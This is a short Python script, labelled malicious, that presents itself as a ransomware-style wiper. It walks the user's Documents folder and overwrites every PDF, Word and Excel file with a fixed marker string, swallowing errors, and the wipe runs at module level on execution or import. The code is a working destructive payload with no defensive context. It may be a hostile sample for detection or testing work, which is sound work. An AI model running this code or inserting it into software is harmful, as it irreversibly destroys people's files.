"""Malicious: Recursive file wiper / encryptor."""
import os

def wipe_user_documents():
    target_dir = os.path.expanduser("~/Documents")
    for root, dirs, files in os.walk(target_dir):
        for name in files:
            if name.endswith((".pdf", ".docx", ".xlsx")):
                filepath = os.path.join(root, name)
                try:
                    with open(filepath, "wb") as f:
                        f.write(b"ENCRYPTED_BY_RANSOMWARE")
                except Exception:
                    pass

wipe_user_documents()
